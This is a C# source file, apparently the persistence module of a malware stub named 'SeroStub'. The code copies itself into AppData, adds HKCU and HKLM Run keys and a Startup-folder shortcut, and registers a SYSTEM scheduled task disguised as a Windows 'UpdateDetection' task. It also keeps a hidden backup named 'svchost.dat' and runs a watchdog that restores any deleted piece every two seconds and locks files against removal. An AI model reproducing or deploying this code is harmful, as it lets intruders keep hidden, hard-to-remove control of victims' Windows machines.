using System.Runtime.InteropServices;
using Microsoft.Win32;

namespace SeroStub;

internal static partial class Persistence
{
    private const string RunKey = @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run";

    private static string? _cachedUserProfile;

    private static string? FindActiveUserProfile()
    {
        if (_cachedUserProfile != null) return _cachedUserProfile;
        try
        {
            using var profileList = Registry.LocalMachine.OpenSubKey(
                @"SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList");
            if (profileList == null) return null;

            foreach (var sid in profileList.GetSubKeyNames())
            {
                if (!sid.StartsWith("S-1-5-21-")) continue;
                using var hive = Registry.Users.OpenSubKey(sid);
                if (hive == null) continue;
                using var pk = profileList.OpenSubKey(sid);
                var profile = pk?.GetValue("ProfileImagePath")?.ToString();
                if (!string.IsNullOrEmpty(profile) && Directory.Exists(profile))
                {
                    _cachedUserProfile = profile;
                    return profile;
                }
            }
        }
        catch { }
        return null;
    }

    private static string GetUserAppData()
    {
        var profile = FindActiveUserProfile();
        if (profile != null) return Path.Combine(profile, @"AppData\Roaming");
        var env = Environment.GetEnvironmentVariable("APPDATA");
        if (!string.IsNullOrEmpty(env) && Directory.Exists(env)) return env;
        return Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
    }

    private static string GetUserLocalAppData()
    {
        var profile = FindActiveUserProfile();
        if (profile != null) return Path.Combine(profile, @"AppData\Local");
        var env = Environment.GetEnvironmentVariable("LOCALAPPDATA");
        if (!string.IsNullOrEmpty(env) && Directory.Exists(env)) return env;
        return Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
    }

    private static string GetUserStartupDir()
        => Path.Combine(GetUserAppData(), @"Microsoft\Windows\Start Menu\Programs\Startup");

    private static RegistryKey? TryOpenUserRunKey(bool writable)
    {
        try
        {
            using var profileList = Registry.LocalMachine.OpenSubKey(
                @"SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList");
            if (profileList == null) return null;
            foreach (var sid in profileList.GetSubKeyNames())
            {
                if (!sid.StartsWith("S-1-5-21-")) continue;
                using var hive = Registry.Users.OpenSubKey(sid);
                if (hive == null) continue;
                return Registry.Users.OpenSubKey($@"{sid}\{RunKey}", writable);
            }
        }
        catch { }
        return null;
    }

    public static string? GetInstalledPath(string name)
    {
        try
        {
            var appData    = GetUserAppData();
            var installDir = Path.Combine(appData, name);
            if (!Directory.Exists(installDir)) return null;
            var exactPath = Path.Combine(installDir, Config.HiddenFileName);
            if (File.Exists(exactPath)) return exactPath;
            var exes = Directory.GetFiles(installDir, "*.exe");
            return exes.Length > 0 ? exes[0] : null;
        }
        catch { return null; }
    }

    public static string? EnsureInstalled(string name, bool isAdmin = false, bool allowMultiInstance = false)
    {
        try
        {
            var selfPath = Environment.ProcessPath;
            if (string.IsNullOrEmpty(selfPath)) return null;

            var appData    = GetUserAppData();
            var installDir = Path.Combine(appData, name);
            var installExe = Path.Combine(installDir, Config.HiddenFileName);

            if (selfPath.StartsWith(installDir, StringComparison.OrdinalIgnoreCase))
                return null;

            Directory.CreateDirectory(installDir);
            File.Copy(selfPath, installExe, true);

            if (isAdmin || allowMultiInstance)
                return null;

            System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo
            {
                FileName = installExe, UseShellExecute = false, CreateNoWindow = true
            });
            return installExe;
        }
        catch { return null; }
    }

    // ── Admin-level persistence ──────────────────────────────────────────────

    public static void InstallRegistryHKLM(string name)
    {
        try
        {
            var selfPath = GetInstalledPath(name) ?? Environment.ProcessPath;
            if (string.IsNullOrEmpty(selfPath)) return;
            using var key = Registry.LocalMachine.OpenSubKey(RunKey, true);
            key?.SetValue(name, $"\"{selfPath}\"");
        }
        catch { }
    }

    public static void RemoveRegistryHKLM(string name)
    {
        try
        {
            using var key = Registry.LocalMachine.OpenSubKey(RunKey, true);
            key?.DeleteValue(name, false);
        }
        catch { }
    }

    private const string _SysTaskFolder = @"Microsoft\Windows\Shell";
    private const string _SysTaskLeaf   = "UpdateDetection";

    public static void InstallService(string name)
    {
        try
        {
            var selfPath = GetInstalledPath(name) ?? Environment.ProcessPath;
            if (string.IsNullOrEmpty(selfPath)) return;
            var taskPath = $@"\{_SysTaskFolder}\{_SysTaskLeaf}";
            RunSchtasks($"/Delete /TN \"{taskPath}\" /F");
            RunSchtasks($"/Create /TN \"{taskPath}\" /TR \"{selfPath}\" /SC ONSTART /RU SYSTEM /RL HIGHEST /F");
        }
        catch { }
    }

    public static bool IsServiceInstalled(string name)
    {
        try
        {
            var (code, _) = RunSchtasks($"/Query /TN \"\\{_SysTaskFolder}\\{_SysTaskLeaf}\"");
            return code == 0;
        }
        catch { return false; }
    }

    public static void RemoveService(string name)
    {
        try { RunSchtasks($"/Delete /TN \"\\{_SysTaskFolder}\\{_SysTaskLeaf}\" /F"); }
        catch { }
    }

    // ── Registry (HKCU\Run) ──────────────────────────────────────────────────

    public static void InstallRegistry(string name)
    {
        try
        {
            var selfPath = GetInstalledPath(name) ?? Environment.ProcessPath;
            if (string.IsNullOrEmpty(selfPath)) return;
            using var key = TryOpenUserRunKey(writable: true)
                            ?? Registry.CurrentUser.OpenSubKey(RunKey, true);
            if (key?.GetValue(name) is string val && val == selfPath) return;
            key?.SetValue(name, selfPath);
        }
        catch { }
    }

    public static void RemoveRegistry(string name)
    {
        try
        {
            using var key = TryOpenUserRunKey(writable: true)
                            ?? Registry.CurrentUser.OpenSubKey(RunKey, true);
            key?.DeleteValue(name, false);
        }
        catch { }
    }

    // ── Startup Folder (.lnk — native binary writer, no PowerShell) ──────────

    public static void InstallStartup(string name)
    {
        try
        {
            var selfPath = GetInstalledPath(name) ?? Environment.ProcessPath;
            if (string.IsNullOrEmpty(selfPath)) return;
            var startupDir = GetUserStartupDir();
            Directory.CreateDirectory(startupDir);
            var lnkPath = Path.Combine(startupDir, $"{name}.lnk");
            if (File.Exists(lnkPath)) return;
            WriteLnkFile(lnkPath, selfPath);
        }
        catch { }
    }

    public static void RemoveStartup(string name)
    {
        try
        {
            var lnkPath = Path.Combine(GetUserStartupDir(), $"{name}.lnk");
            if (File.Exists(lnkPath)) File.Delete(lnkPath);
        }
        catch { }
    }

    // ── Scheduled Task ───────────────────────────────────────────────────────

    public static void InstallScheduledTask(string name)
    {
        try
        {
            var selfPath = GetInstalledPath(name) ?? Environment.ProcessPath;
            if (string.IsNullOrEmpty(selfPath)) return;
            var (qCode, _) = RunSchtasks($"/Query /TN \"{name}\"");
            if (qCode == 0) return;
            // Try highest runlevel (requires admin), fall back to normal
            var (code, _) = RunSchtasks($"/Create /TN \"{name}\" /TR \"{selfPath}\" /SC ONLOGON /RL HIGHEST /F");
            if (code != 0)
                RunSchtasks($"/Create /TN \"{name}\" /TR \"{selfPath}\" /SC ONLOGON /F");
        }
        catch { }
    }

    public static void RemoveScheduledTask(string name)
    {
        try { RunSchtasks($"/Delete /TN \"{name}\" /F"); }
        catch { }
    }

    private static DateTime _lastTaskCheck  = DateTime.MinValue;
    private static bool     _lastTaskResult = true;

    public static bool IsTaskInstalled(string name)
    {
        try
        {
            if ((DateTime.UtcNow - _lastTaskCheck).TotalSeconds < 60)
                return _lastTaskResult;
            var (code, _)  = RunSchtasks($"/Query /TN \"{name}\"");
            _lastTaskResult = code == 0;
            _lastTaskCheck  = DateTime.UtcNow;
            return _lastTaskResult;
        }
        catch { return false; }
    }

    // ── Watchdog ─────────────────────────────────────────────────────────────

    private static FileStream? _exeLock;
    private static FileStream? _lnkLock;
    private static FileStream? _backupLock;
    private static volatile bool _watchdogRunning;
    private static string? _cachedLnkPath;
    private static string? _cachedStartupDir;

    public static void StopWatchdog()
    {
        _watchdogRunning = false;
        try { _exeLock?.Dispose(); }    catch { } finally { _exeLock    = null; }
        try { _lnkLock?.Dispose(); }    catch { } finally { _lnkLock    = null; }
        try { _backupLock?.Dispose(); } catch { } finally { _backupLock = null; }
    }

    public static void StartWatchdog(string name)
    {
        if (_watchdogRunning) return;
        _watchdogRunning = true;

        var appData    = GetUserAppData();
        var installDir = Path.Combine(appData, name);
        var installExe = Path.Combine(installDir, Config.HiddenFileName);

        var localAppData = GetUserLocalAppData();
        var backupDir    = Path.Combine(localAppData, "Microsoft", "WindowsServices");
        var backupExe    = Path.Combine(backupDir, "svchost.dat");

        CreateBackup(installExe, backupDir, backupExe);
        _exeLock    = LockFile(installExe);
        _backupLock = LockFile(backupExe);

        if (Config.PersistStartup)
        {
            _cachedStartupDir = GetUserStartupDir();
            _cachedLnkPath    = Path.Combine(_cachedStartupDir, $"{name}.lnk");
            _lnkLock          = LockFile(_cachedLnkPath);
        }

        try
        {
            var watcher = new FileSystemWatcher(installDir)
            {
                NotifyFilter        = NotifyFilters.FileName | NotifyFilters.LastWrite,
                EnableRaisingEvents = true
            };
            watcher.Deleted += (_, _) => { Thread.Sleep(500); RestoreAll(name, installExe, backupDir, backupExe); };
            watcher.Renamed += (_, _) => { Thread.Sleep(500); RestoreAll(name, installExe, backupDir, backupExe); };
        }
        catch { }

        if (Config.PersistStartup && _cachedStartupDir != null && Directory.Exists(_cachedStartupDir))
        {
            try
            {
                var startupFsw = new FileSystemWatcher(_cachedStartupDir)
                {
                    NotifyFilter        = NotifyFilters.FileName,
                    Filter              = $"{name}.lnk",
                    EnableRaisingEvents = true
                };
                startupFsw.Deleted += (_, _) =>
                {
                    Thread.Sleep(500);
                    _lnkLock?.Dispose(); _lnkLock = null;
                    InstallStartup(name);
                    _lnkLock = LockFile(_cachedLnkPath!);
                };
            }
            catch { }
        }

        var thread = new Thread(() => WatchdogLoop(name, installExe, backupDir, backupExe))
        {
            IsBackground = true,
            Priority     = ThreadPriority.BelowNormal
        };
        thread.Start();
    }

    private static void WatchdogLoop(string name, string installExe, string backupDir, string backupExe)
    {
        while (_watchdogRunning)
        {
            try { Thread.Sleep(2000); RestoreAll(name, installExe, backupDir, backupExe); }
            catch { }
        }
    }

    private static void RestoreAll(string name, string installExe, string backupDir, string backupExe)
    {
        if (!File.Exists(installExe))
        {
            _exeLock?.Dispose(); _exeLock = null;
            try
            {
                Directory.CreateDirectory(Path.GetDirectoryName(installExe)!);
                var seroExe = Environment.GetEnvironmentVariable("SERO_EXE");
                if (File.Exists(backupExe))
                    File.Copy(backupExe, installExe, true);
                else if (!string.IsNullOrEmpty(seroExe) && File.Exists(seroExe))
                    File.Copy(seroExe, installExe, true);
                else
                {
                    var selfPath = Environment.ProcessPath;
                    if (!string.IsNullOrEmpty(selfPath) && File.Exists(selfPath))
                        File.Copy(selfPath, installExe, true);
                }
                for (int i = 0; i < 3 && _exeLock == null; i++)
                {
                    _exeLock = LockFile(installExe);
                    if (_exeLock == null) Thread.Sleep(300);
                }
            }
            catch { }
        }

        if (!File.Exists(backupExe))
        {
            _backupLock?.Dispose(); _backupLock = null;
            CreateBackup(installExe, backupDir, backupExe);
            _backupLock = LockFile(backupExe);
        }

        if (Config.PersistRegistry && !IsRegistryInstalled(name))
            InstallRegistry(name);

        if (Config.PersistStartup && !IsStartupInstalled(name))
        {
            _lnkLock?.Dispose(); _lnkLock = null;
            InstallStartup(name);
            _lnkLock = LockFile(_cachedLnkPath ?? Path.Combine(
                Environment.GetFolderPath(Environment.SpecialFolder.Startup), $"{name}.lnk"));
        }

        if (Config.PersistTask && !IsTaskInstalled(name))
            InstallScheduledTask(name);
    }

    // ── Check methods ────────────────────────────────────────────────────────

    public static bool IsRegistryInstalled(string name)
    {
        try
        {
            using var key = TryOpenUserRunKey(writable: false)
                            ?? Registry.CurrentUser.OpenSubKey(RunKey, false);
            return key?.GetValue(name) != null;
        }
        catch { return false; }
    }

    public static bool IsStartupInstalled(string name)
    {
        try
        {
            var lnkPath = _cachedLnkPath ?? Path.Combine(GetUserStartupDir(), $"{name}.lnk");
            return File.Exists(lnkPath);
        }
        catch { return false; }
    }

    // ── Private helpers ──────────────────────────────────────────────────────

    private static void CreateBackup(string sourceExe, string backupDir, string backupExe)
    {
        try
        {
            Directory.CreateDirectory(backupDir);
            if (!File.Exists(sourceExe)) return;
            File.Copy(sourceExe, backupExe, true);
            File.SetAttributes(backupExe, FileAttributes.Hidden | FileAttributes.System);
            File.SetAttributes(backupDir, FileAttributes.Hidden);
        }
        catch { }
    }

    private static FileStream? LockFile(string path)
    {
        try
        {
            if (!File.Exists(path)) return null;
            return new FileStream(path, FileMode.Open, FileAccess.Read, FileShare.Read);
        }
        catch { return null; }
    }

    private static (int code, string output) RunSchtasks(string args)
    {
        try
        {
            var psi = new System.Diagnostics.ProcessStartInfo
            {
                FileName               = "schtasks.exe",
                Arguments              = args,
                RedirectStandardOutput = true,
                RedirectStandardError  = true,
                UseShellExecute        = false,
                CreateNoWindow         = true,
                WindowStyle            = System.Diagnostics.ProcessWindowStyle.Hidden
            };
            using var proc = System.Diagnostics.Process.Start(psi);
            if (proc == null) return (-1, "");
            var output = proc.StandardOutput.ReadToEnd();
            proc.WaitForExit(10000);
            return (proc.ExitCode, output);
        }
        catch { return (-1, ""); }
    }

    // Writes a minimal Shell Link (.lnk) file pointing at targetPath — no COM, no PowerShell.
    // Format: Shell Link Header (76 bytes) + LinkInfo block with VolumeID + LocalBasePath.
    private static void WriteLnkFile(string lnkPath, string targetPath)
    {
        var pathBytes = System.Text.Encoding.Default.GetBytes(targetPath);

        const uint liHdrSize = 28;
        const uint volIdSize = 17;  // 16-byte struct + 1-byte null label
        uint localBasOff     = liHdrSize + volIdSize;
        uint commonSuffOff   = localBasOff + (uint)pathBytes.Length + 1;
        uint linkInfoSize    = commonSuffOff + 1;

        using var fs = File.Create(lnkPath);
        using var bw = new BinaryWriter(fs);

        // Shell Link Header (76 bytes)
        bw.Write((uint)76);
        bw.Write(new byte[] {                       // LinkCLSID {00021401-0000-0000-C000-000000000046}
            0x01,0x14,0x02,0x00, 0x00,0x00, 0x00,0x00,
            0xC0,0x00,0x00,0x00, 0x00,0x00,0x00,0x46 });
        bw.Write((uint)0x00000084);                 // LinkFlags: HasLinkInfo | IsUnicode
        bw.Write((uint)0x00000020);                 // FileAttributes: FILE_ATTRIBUTE_NORMAL
        bw.Write((ulong)0); bw.Write((ulong)0); bw.Write((ulong)0); // timestamps
        bw.Write((uint)0);                          // FileSize
        bw.Write((uint)0);                          // IconIndex
        bw.Write((uint)1);                          // ShowCommand: SW_SHOWNORMAL
        bw.Write((ushort)0); bw.Write((ushort)0);   // HotKey, Reserved1
        bw.Write((uint)0); bw.Write((uint)0);       // Reserved2, Reserved3

        // LinkInfo
        bw.Write(linkInfoSize);
        bw.Write(liHdrSize);                        // LinkInfoHeaderSize = 0x1C
        bw.Write((uint)1);                          // LinkInfoFlags: VolumeIDAndLocalBasePath
        bw.Write(liHdrSize);                        // VolumeIDOffset (right after header)
        bw.Write(localBasOff);                      // LocalBasePathOffset
        bw.Write((uint)0);                          // CommonNetworkRelativeLinkOffset (absent)
        bw.Write(commonSuffOff);                    // CommonPathSuffixOffset

        // VolumeID (17 bytes)
        bw.Write(volIdSize);
        bw.Write((uint)3);                          // DriveType: DRIVE_FIXED
        bw.Write((uint)0);                          // DriveSerialNumber
        bw.Write((uint)16);                         // VolumeLabelOffset
        bw.Write((byte)0);                          // null label

        // LocalBasePath (ANSI, null-terminated) + CommonPathSuffix (null)
        bw.Write(pathBytes);
        bw.Write((byte)0);
        bw.Write((byte)0);
    }
}
